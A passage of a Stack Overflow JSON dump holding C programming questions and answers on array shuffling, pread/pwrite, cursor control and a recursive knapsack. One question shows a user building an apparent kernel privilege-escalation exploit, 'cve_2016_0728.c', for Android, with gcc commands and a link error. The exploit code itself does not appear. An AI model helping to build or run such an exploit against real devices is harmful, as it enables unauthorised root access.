<code>int</code> to store it in <code>tmp</code>, and then you cast <code>tmp</code> back to <code>(char *)</code>. Just declare <code>tmp</code> as a pointer to <code>char</code> to start with. The first loop counts down from <code>size</code> to 0; this is out of array bounds to start, but why not just use the conventional loop construction: <code>for (i = 0; i &lt; size; i++)</code>? Also, you should consider using <code>size_t</code> for array indices; it is an unsigned integer type guaranteed to be able to hold any array index, and is also the type returned by the <code>sizeof</code> operator.</p>\n\n<p>Further, in your first version you have declared <code>array</code> as an array of pointers to <code>const char</code>s. You can do this, but you need the temporary storage variable <code>tmp</code> to agree with the <code>const</code> type qualifier.</p>\n\n<p>Here is your code with the above changes. There are no casts, it compiles without warnings, and it works.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nint main(void)\n{\n    const char *array[] = {\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"};\n\n    const char *tmp;\n    size_t i, size;\n    int randomize;\n\n    size = sizeof(array) / sizeof(*array);\n\n    srand(time(NULL));\n\n    for(i = 0; i &lt; size; i++){\n        randomize = (rand() % size);\n        tmp = array[i];\n        array[i] = array[randomize];\n        array[randomize] = tmp;\n    }\n\n    for(i = 0; i &lt; size; i++)\n        printf(\"%s\", array[i]);\n    putchar('\\n');\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 7036526, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/39e835dd5de2bdad11a740357092c5e4?s=128&d=identicon&r=PG&f=1", "display_name": "Carlo Di Dato", "link": "https://stackoverflow.com/users/7036526/carlo-di-dato"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 41363218, "answer_count": 2, "score": -1, "last_activity_date": 1482938213, "creation_date": 1482931414, "question_id": 41363036, "link": "https://stackoverflow.com/questions/41363036/null-pointer-using-const-instead-of-variable-declaration", "title": "Null pointer using const instead of variable declaration", "body": "<p>I have a problem I can't figure out. I wrote this code to shuffle the elements of an array:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nconst char *array[]={\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"};\n\nint main(int argc, char **argv)\n{\n int i, tmp, randomize, size;\n\n size = sizeof(array)/sizeof(*array);\n\n srand(time(NULL));\n\n for(i=size;i&gt;0;i--){\n  randomize=0+(rand()%size);\n  tmp=(int)array[i];\n  array[i]=array[randomize];\n  array[randomize]=(char*)tmp;\n }\n\n for(i=0;i&lt;size;i++)\n  printf(\"%s\", array[i]);   \n    return 0;\n}\n</code></pre>\n\n<p>When I run the program, this is the iutput:</p>\n\n<pre><code>azlngiwexbv(null)uscphqjyrodmtk\n</code></pre>\n\n<p>I can't understand why the pointer is sometimes null and I can't understand why, changing the source code in this way:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\nint main(int argc, char **argv)\n{\n char *array[]={\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"};\n int i, tmp, randomize, size;\n\n size = sizeof(array)/sizeof(*array);\n\n srand(time(NULL));\n\n for(i=size;i&gt;0;i--){\n  randomize=0+(rand()%size);\n  tmp=(int)array[i];\n  array[i]=array[randomize];\n  array[randomize]=(char*)tmp;\n }\n\n for(i=0;i&lt;size;i++)\n  printf(\"%s\", array[i]);    \n return 0;\n}\n</code></pre>\n\n<p>Everything works fine.\nThanks.</p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 1, "creation_date": 1482934395, "post_id": 41363026, "comment_id": 69928905, "body": "You have 2 problems, one is that you have an overflow and the second is that your library can&#39;t be found.  So, first off, you have to fix the conversion and 2nd, you have to find a 32bit version of keyutils library on your system.    Since you don&#39;t post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>, we can&#39;t help with the first and the 2nd is up to you."}, {"owner": {"reputation": 666, "user_id": 2393280, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gybse.jpg?s=128&g=1", "display_name": "Matan Tubul", "link": "https://stackoverflow.com/users/2393280/matan-tubul"}, "reply_to_user": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 0, "creation_date": 1482934898, "post_id": 41363026, "comment_id": 69929205, "body": "do you know where i can find 32bit vewrsion?because in google is not available"}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 1, "creation_date": 1482937783, "post_id": 41363026, "comment_id": 69930801, "body": "You&#39;ll have to at least tell us what you&#39;re trying to do and what functions call the keyutils library - right now we know nothing about what you&#39;re doing."}, {"owner": {"reputation": 3181, "user_id": 2828217, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2218f355aa10d4319429930f3a68f8?s=128&d=identicon&r=PG&f=1", "display_name": "brm", "link": "https://stackoverflow.com/users/2828217/brm"}, "edited": false, "score": 0, "creation_date": 1482938055, "post_id": 41363026, "comment_id": 69930973, "body": "If you need the 32bit version, perhaps you can <a href=\"http://people.redhat.com/~dhowells/keyutils/\" rel=\"nofollow noreferrer\">download</a> it and compile it yourself (you may need to change the <code>Makefile</code> so that 32bit code is generated)"}], "owner": {"reputation": 666, "user_id": 2393280, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gybse.jpg?s=128&g=1", "display_name": "Matan Tubul", "link": "https://stackoverflow.com/users/2393280/matan-tubul"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 496, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1493024082, "creation_date": 1482931361, "question_id": 41363026, "link": "https://stackoverflow.com/questions/41363026/ld-cannot-find-lkeyutils-in-gcc", "title": "ld: cannot find -lkeyutils in gcc", "body": "<p>I am a begginer all arroung gcc compiling. i have some program in c which there i try to compile in order to run it in Android devices.</p>\n\n<p>currently i succeded to compile it under 64 bit but it is not running in the android device so i would like to try it in 32 bit mode.</p>\n\n<p>when i compile it i execute it succesfully:</p>\n\n<pre><code>gcc  cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall -Woverflow\n</code></pre>\n\n<p>when i try to execute it in 32 bit mode with the following command i get:</p>\n\n<pre><code>gcc -m32 cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall -Woverflow\n</code></pre>\n\n<p>error:</p>\n\n<pre><code> cve_2016_0728.c: In function \u2018main\u2019:\n    cve_2016_0728.c:55:11: warning: overflow in implicit constant conversion [-Woverflow]\n  } msg = {0x4141414141414141, {0}};\n           ^\n/usr/bin/ld: cannot find -lkeyutils\ncollect2: error: ld returned 1 exit status\n</code></pre>\n"}, {"tags": ["c", "linux", "linux-kernel", "operating-system"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1482937404, "post_id": 41362754, "comment_id": 69930588, "body": "Per <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/read.html\" rel=\"nofollow noreferrer\">the standard</a>, <code>read()</code>, <code>pread()</code>, <code>write()</code> and <code>pwrite()</code> return <code>ssize_t</code>, not <code>int</code>."}], "answers": [{"comments": [{"owner": {"reputation": 125, "user_id": 7077615, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/DGtI3.jpg?s=128&g=1", "display_name": "metarose", "link": "https://stackoverflow.com/users/7077615/metarose"}, "edited": false, "score": 0, "creation_date": 1482931498, "post_id": 41362803, "comment_id": 69927272, "body": "Output didn&#39;t changed. It still same result."}, {"owner": {"reputation": 1667, "user_id": 4490542, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8925b87f1bc4c6a3bc6956628c9d3b6f?s=128&d=identicon&r=PG&f=1", "display_name": "e.jahandar", "link": "https://stackoverflow.com/users/4490542/e-jahandar"}, "reply_to_user": {"reputation": 125, "user_id": 7077615, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/DGtI3.jpg?s=128&g=1", "display_name": "metarose", "link": "https://stackoverflow.com/users/7077615/metarose"}, "edited": false, "score": 0, "creation_date": 1482931532, "post_id": 41362803, "comment_id": 69927294, "body": "did you replaced all instances? edit your post and put edited code"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1482938927, "post_id": 41362803, "comment_id": 69931450, "body": "This should not matter. I am not saying that the change from <code>&amp;buf_wr</code> to <code>buf_wr</code> is wrong, but that this argument is of type <code>(const void *)</code> in the function prototype; both of the above expressions will lead to the same function call after the type conversion."}], "tags": [], "owner": {"reputation": 1667, "user_id": 4490542, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8925b87f1bc4c6a3bc6956628c9d3b6f?s=128&d=identicon&r=PG&f=1", "display_name": "e.jahandar", "link": "https://stackoverflow.com/users/4490542/e-jahandar"}, "is_accepted": false, "score": 2, "last_activity_date": 1482931506, "last_edit_date": 1482931506, "creation_date": 1482930538, "answer_id": 41362803, "question_id": 41362754, "link": "https://stackoverflow.com/questions/41362754/reading-with-pread-and-writing-with-pwrite-in-c/41362803#41362803", "title": "reading with pread() and writing with pwrite() in c", "body": "<p>You're using pointers incorrectly, accessing to address of arrays should be with their names alone, not &amp;name.</p>\n\n<p>replace &amp;buf_wr with buf_wr, accessing to incorrect address with &amp;buf_wr to writing there will corrupt your stack and also variables defined inside stack</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>replace </p>\n\n<pre><code>nw = pwrite(fd, &amp;buf_wr, strlen(buf_wr), 14);\n</code></pre>\n\n<p>to</p>\n\n<pre><code>nw = pwrite(fd, buf_wr, strlen(buf_wr), 14);\n</code></pre>\n\n<p>and all other instances..</p>\n"}, {"tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": true, "score": 2, "last_activity_date": 1482934671, "creation_date": 1482934671, "answer_id": 41363913, "question_id": 41362754, "link": "https://stackoverflow.com/questions/41362754/reading-with-pread-and-writing-with-pwrite-in-c/41363913#41363913", "title": "reading with pread() and writing with pwrite() in c", "body": "<p>1) <code>close()</code> fails because you are closing the file <em>twice</em>:</p>\n\n<pre><code>//close file\nclose(fd);\n\n//error check close process\nif(close(fd) == -1){\n</code></pre>\n\n<p>After the first call to <code>close(fd);</code>, <code>fd</code> becomes indeterminate and the second call to <code>close(fd)</code> fails. You just need to remove the first call to <code>close(fd);</code>.</p>\n\n<p>2) You are printing <code>buf_rd</code> as if it's a C-string. <code>read()</code> doesn't terminate <code>buf_rd</code> with a null byte.</p>\n\n<p>3) You are writing at random offsets (14 and 30) using <code>pwrite()</code>. But <code>read()</code> reads from current offset - which means the starting byte could a null byte and thus <code>%s</code> stops printing right away (i.e. prints nothing). You are reading a lot more than what you write. That means <code>read()</code> is going to return less than the requested number of bytes. So use the return value of <code>read()</code> to get the number of bytes successfully read.</p>\n\n<p>Instead, print each byte using a loop:</p>\n\n<pre><code> for (size_t l = 0; l &lt; nr; l++)\n    printf(\"%c\", buf_rd[l]);\n</code></pre>\n\n<p>and </p>\n\n<pre><code> for (size_t l = 0; l &lt; nr2; l++)\n    printf(\"%c\", buf_rd2[l]);\n</code></pre>\n"}], "owner": {"reputation": 125, "user_id": 7077615, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/DGtI3.jpg?s=128&g=1", "display_name": "metarose", "link": "https://stackoverflow.com/users/7077615/metarose"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7770, "favorite_count": 1, "accepted_answer_id": 41363913, "answer_count": 2, "score": 1, "last_activity_date": 1482942504, "creation_date": 1482930316, "last_edit_date": 1482942504, "question_id": 41362754, "link": "https://stackoverflow.com/questions/41362754/reading-with-pread-and-writing-with-pwrite-in-c", "title": "reading with pread() and writing with pwrite() in c", "body": "<p>My program(below) writes(with <strong>pwrite()</strong>) text to a file and reads(with <strong>pread()</strong>) from the file. My problems are pread function doesn't read my text from file and what's wrong with close function(last part of program)? Results is in the second part. Where is my mistake? </p>\n\n<pre><code>    #include &lt;fcntl.h&gt;\n    #include &lt;stdio.h&gt;\n    #include &lt;string.h&gt;\n    #include &lt;unistd.h&gt;\n    #include &lt;sys/stat.h&gt;\n    #include &lt;sys/types.h&gt;\n\n    int main()\n    {\n\n        int fd, nr, nr2, nw, nw2;\n        char fl_nm[]={\"file_io/pwrite.txt\"};\n        char buf_wr[]={\"hello everyone this is first text\\n\"};\n        char buf_wr2[]={\"Did you miss me? Don't afraid\\n\"};\n        char buf_rd[120];\n        char buf_rd2[120];\n\n        //open file\n        fd = open(fl_nm, O_RDWR|O_CREAT, 0777);\n        nw = pwrite(fd, &amp;buf_wr, strlen(buf_wr), 14);\n\n        //error checking\n        if(fd == -1){\n            perror(\"[error in open]\\n\");\n        }\n        else if(nw == -1){\n            perror(\"[error in write]\\n\");\n        }\n        else{\n\n            /*if open and write process are okey, read first write data\n            * from file*/\n            nr = read(fd, &amp;buf_rd, sizeof(buf_rd));\n\n            //display succeeded message about first write and open process\n            printf(\"[file is opened]\\n\");\n            printf(\"[succeeded write(1) process]\\n\");\n\n            //read process error control\n            if(nr == -1){\n                perror(\"[error in read]\\n\");\n            } else{\n            printf(\"[reading(1) data] from %s\\n\", fl_nm);\n            printf(\"[%s]\\n\", buf_rd);\n            }\n\n        }\n\n        //second write process.\n        nw2= pwrite(fd, &amp;buf_wr2, strlen(buf_wr2), 30);\n\n        //write error checking\n        if(nw2 == -1){\n            perror(\"[error in write 2]\\n\");\n        }else{\n\n            /*if write process is correct\n            * second read process*/\n            nr2 = read(fd, &amp;buf_rd2, sizeof(buf_rd));\n\n            printf(\"-----------------------------------\\n\");\n            printf(\"[succeeded write(2) process]\\n\");\n            printf(\"[reading(2) data] from %s\\n\", fl_nm);\n            printf(\"[%s]\\n\", buf_rd2);\n        }\n\n        //close file\n        close(fd);\n\n        //error checking for close process\n        if(close(fd) == -1){\n            perror(\"[error in close]\\n\");\n        }else{\n            printf(\"[succeeded in close]\\n\");\n        }\n\n        return 0;\n    }\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>$ gcc pwrite.c -o pwrite\n$ ./pwrite\n[file is opened]\n[succeeded write(1) process]\n[reading(1) data] from file_io/pwrite.txt\n[]\n-----------------------------------\n[succeeded write(2) process]\n[reading(2) data] from file_io/pwrite.txt\n[]\n[error in close]\n: Bad file descriptor\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 1, "creation_date": 1482928690, "post_id": 41362324, "comment_id": 69925749, "body": "You can&#39;t &quot;move forward&quot; if there&#39;s no text to move to. Are you sure you don&#39;t just want to as spaces or tabs?"}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 1, "creation_date": 1482928727, "post_id": 41362324, "comment_id": 69925768, "body": "Based on your edit, do you mean move backwards? In your example, you&#39;d need to erase the &#39;k&#39; using <code>\\b</code> (the backspace character), then retype the &#39;e&#39;."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482928813, "post_id": 41362324, "comment_id": 69925819, "body": "Maybe what he wants is a carriage return <code>\\r</code> but I am a bit confused by his question. And <code>\\r</code> might not bring the expected result on some consoles."}, {"owner": {"reputation": 9, "user_id": 6698508, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1ca98ee7bb5527f15309f3bddeee12e3?s=128&d=identicon&r=PG&f=1", "display_name": "Byron", "link": "https://stackoverflow.com/users/6698508/byron"}, "edited": false, "score": 0, "creation_date": 1482928864, "post_id": 41362324, "comment_id": 69925852, "body": "But it&#39;s allowed to use printf(&quot;\\b&quot;), right?"}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1482929001, "post_id": 41362324, "comment_id": 69925931, "body": "@Byron Yes, <code>\\b</code> acts as though you hit the backspace key. It doesn&#39;t work in every console though. It&#39;s the only way I know of to change what&#39;s already been printed though."}], "answers": [{"tags": [], "owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "is_accepted": false, "score": 2, "last_activity_date": 1563830184, "last_edit_date": 1563830184, "creation_date": 1482929594, "answer_id": 41362552, "question_id": 41362324, "link": "https://stackoverflow.com/questions/41362324/how-to-move-the-text-cursor-forward/41362552#41362552", "title": "How to move the text cursor forward?", "body": "<p>Based on your \"I like\" example, I'm going to assume you meant move \"backwards\" instead of \"forwards\". </p>\n\n<p>To the best of my knowledge, there's no super easy way to achieve what you're trying to do. You can't actually programatically move the cursor unless you simulate pressing the arrow keys on the keyboard. That assumes the console you're using supports moving the cursor though. </p>\n\n<p>The closest method I know of is to use the backspace key (<code>\\b</code>) to erase the \"e\", insert the \"k\", then retype the \"e\":</p>\n\n<ul>\n<li><p>Print \"I lie\". </p></li>\n<li><p>Print\" \"\\b\". This will erase the last character printed (\"e\"). </p></li>\n<li><p>Print \"ke\". </p></li>\n</ul>\n\n<p>Note, <code>\\b</code> doesn't always work:</p>\n\n<ul>\n<li><p>It doesn't appear to work in REPLs, only full consoles. </p></li>\n<li><p>It can't erase anything that came before a newline (<code>\\n</code>). Once you print a new line, you've \"saved\" everything on that line. </p></li>\n</ul>\n\n<p>You can also use the system call \"cls\" to wipe the screen entirely, but that has poor compatibility too and requires you to retype everything, not just the last few characters.</p>\n\n<hr>\n\n<p>I'll note that after looking over my answer a few years later, I'm actually wrong. You can in fact move the cursor. This can be done using ANSII escape codes, or a library that wraps over them like Curses. Unless you need that though, pushing a backspace is probably the easiest option. </p>\n"}], "owner": {"reputation": 9, "user_id": 6698508, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1ca98ee7bb5527f15309f3bddeee12e3?s=128&d=identicon&r=PG&f=1", "display_name": "Byron", "link": "https://stackoverflow.com/users/6698508/byron"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 762, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1563830184, "creation_date": 1482928603, "last_edit_date": 1482928945, "question_id": 41362324, "link": "https://stackoverflow.com/questions/41362324/how-to-move-the-text-cursor-forward", "title": "How to move the text cursor forward?", "body": "<p>We can add <strong>'\\n'</strong> character to a string so that it can go to next line when we use  <code>printf</code>.</p>\n\n<p>Then, how to move the text cursor forward exactly one row?\nAs easy as we implement next line using <strong>'\\n'</strong>.</p>\n\n<p>For example, this is a string \"I lie<code>\\moveforwardk</code>k\"</p>\n\n<p>It should be \"I like\" when I output the string using <code>printf</code>.</p>\n"}, {"tags": ["c", "recursion", "knapsack-problem"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1483286777, "post_id": 41362245, "comment_id": 70038055, "body": "Where&#39;s the rest of the code?"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1483286809, "post_id": 41362245, "comment_id": 70038068, "body": "What did you see when you stepped through it in the debugger?"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1483286849, "post_id": 41362245, "comment_id": 70038082, "body": "What do all the function parameters represent?"}, {"owner": {"reputation": 3522, "user_id": 4964791, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aVT1l.jpg?s=128&g=1", "display_name": "RamblinRose", "link": "https://stackoverflow.com/users/4964791/ramblinrose"}, "edited": false, "score": 2, "creation_date": 1483287026, "post_id": 41362245, "comment_id": 70038131, "body": "This code doesn&#39;t even compile."}], "answers": [{"tags": [], "owner": {"reputation": 7158, "user_id": 6245535, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bfdf9b5500b424c198a474f7e8aeff8a?s=128&d=identicon&r=PG&f=1", "display_name": "Loris Securo", "link": "https://stackoverflow.com/users/6245535/loris-securo"}, "is_accepted": true, "score": 3, "last_activity_date": 1483298550, "creation_date": 1483298550, "answer_id": 41418273, "question_id": 41362245, "link": "https://stackoverflow.com/questions/41362245/print-the-values-of-knapsack-solution/41418273#41418273", "title": "Print the values of knapsack solution", "body": "<p><strong>Premise 1</strong>: in your code, the recursion calls to <code>knapSack</code> are not passing <code>arr</code>, which should cause a compilation error, I assume it's just a copy/paste error.</p>\n\n<p><strong>Premise 2</strong>: with the data you proposed, the resulting <code>arr</code> value is not all <code>1</code> as you indicated, but <code>01011</code>, which is still incorrect.</p>\n\n<p>Consider the hypothetical situation in which, during the execution of your function, <code>with</code> is greater than <code>without</code>: during the <code>with</code> calculation <code>arr</code> is filled with the correct values; but then start the <code>without</code> calculation which is going to overwrite the <code>arr</code> values.</p>\n\n<p>Since <code>with</code> is greater than <code>without</code>, the returned <code>arr</code> will be the wrong one, and this is the cause of the problem.</p>\n\n<p>A simple fix would be to make a copy of the <code>arr</code> returned by the <code>with</code> calculation so it is not going to be overwritten by the <code>without</code> calculation, for example:</p>\n\n<pre><code>int with=val[index]+knapSack(W-wt[index], wt, val, n, index+1, arr);\n\n// copy the \"with\" arr\nint arrWith[n];\ncopyArr(arr, arrWith, n);\n\nint without=knapSack(W, wt, val, n, index+1, arr);\n\nif(with&gt;without){\n    // restore the \"with\" arr\n    copyArr(arrWith, arr, n);\n\n    arr[index]=1;\n    return with;\n}\nelse{\n    arr[index]=0;\n    return without;\n}\n</code></pre>\n\n<p><code>copyArr</code> is simply:</p>\n\n<pre><code>void copyArr(int arr[], int arrDest[], int n) {\n    int i;\n    for(i = 0; i &lt; n; i++) {\n        arrDest[i] = arr[i];\n    }\n}\n</code></pre>\n\n<p>With this fix the resulting value of <code>arr</code> is correctly <code>01101</code>.</p>\n"}], "owner": {"reputation": 247, "user_id": 1689604, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/c7fcee0f5599419375e9ec460fb26354?s=128&d=identicon&r=PG", "display_name": "Yinon Eliraz", "link": "https://stackoverflow.com/users/1689604/yinon-eliraz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 864, "favorite_count": 0, "accepted_answer_id": 41418273, "answer_count": 1, "score": -2, "last_activity_date": 1483298550, "creation_date": 1482928354, "last_edit_date": 1483291080, "question_id": 41362245, "link": "https://stackoverflow.com/questions/41362245/print-the-values-of-knapsack-solution", "title": "Print the values of knapsack solution", "body": "<p>I have the following solution for the knapsack problem:(wt[] is the weights array, val[] is the values array, n is the arrays size, index is the current item that we are trying (for the recursion) and arr is an array that represents weather or not item i was included in the solution.</p>\n\n<pre><code>int knapSack(int W, int wt[], int val[], int n, int index, int arr[])\n{\n   if (n == index || W == 0)\n       return 0;\n   if (wt[index] &gt; W)\n       return knapSack(W, wt, val, n, index+1 );\n\n   int with=val[index]+knapSack(W-wt[index], wt, val, n, index+1);\n   int without=knapSack(W, wt, val, n, index+1);\n\n   if(with&gt;without){\n       arr[index]=1;\n       return with;\n   }\n   else{\n       arr[index]=0;\n       return without;\n   }\n\n}\n</code></pre>\n\n<p>I am trying to print, in this recursive solution the items that are chosen, by setting the indexes of the taken ones in an array (res) to 1.<br>\nAs I understand, if <code>with&gt;without</code>, it means that I am choosing the current item, or item #index. So why is this not returning a right value?<Br>\nI am using the recursive algorithm for a reason, I know using the memoization version can be easier here. \nExample:<br>\nWeights: 5 6 7 10 11<br>\nValues: 2 4 5 6 9<br>\nW=25<br>\nWill return 5 ones in array res. When solution is 18 with items 2,3,5 (starting from index 1).</p>\n"}, {"tags": ["c", "arrays", "algorithm"], "answers": [{"comments": [{"owner": {"reputation": 526, "user_id": 3163216, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8b26cac504c060277cce703d2e560319?s=128&d=identicon&r=PG&f=1", "display_name": "mirx", "link": "https://stackoverflow.com/users/3163216/mirx"}, "edited": false, "score": 0, "creation_date": 1482928788, "post_id": 41362301, "comment_id": 69925800, "body": "It did not help, because for the array <code>1 1 1 3 3 3 2 2 2</code> it shows index <code>2</code>: <a href=\"http://pastie.org/private/nyhnpig0m8l80laoefg\" rel=\"nofollow noreferrer\">pastie.org/private/nyhnpig0m8l80laoefg</a>"}], "tags": [], "owner": {"reputation": 26971, "user_id": 3073272, "user_type": "registered", "accept_rate": 48, "profile_image": "https://i.stack.imgur.com/hofYF.jpg?s=128&g=1", "display_name": "GorvGoyl", "link": "https://stackoverflow.com/users/3073272/gorvgoyl"}, "is_accepted": false, "score": 1, "last_activity_date": 1482928986, "last_edit_date": 1482928986, "creation_date": 1482928528, "answer_id": 41362301, "question_id": 41362212, "link": "https://stackoverflow.com/questions/41362212/finding-the-number-of-row-with-the-smallest-sum-of-powers-c/41362301#41362301", "title": "Finding the number of row with the smallest sum of powers, C", "body": "<p>I think you meant this:</p>\n\n<pre><code>     if(sum &lt;= minsum ){\n         minindex = i;\n         minsum = sum;\n     }\n</code></pre>\n\n<p>Also, initially assign integer_max to <code>minsum</code>.</p>\n\n<p>Here's the code:</p>\n\n<pre><code>int smallest_powers_sum(int **array, int n, int m)\n{\n    int sum = 0, minsum = 1000000, i, j, minindex = -1;\n\n    for(i=0; i&lt;n; i++)\n    {\n\n        sum = 0;\n\n        for(j=0; j&lt;m; j++)\n        {\n            sum += pow(array[i][j], 2);\n        }\n\n        if(sum &lt;= minsum ){\n         minindex = i;\n         minsum = sum;\n     }\n\n        printf(\"sum = %d, minsum = %d, minindex = %d\\n\", sum, minsum, minindex);\n    }\n\n    return minindex;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "is_accepted": false, "score": 0, "last_activity_date": 1482928655, "creation_date": 1482928655, "answer_id": 41362333, "question_id": 41362212, "link": 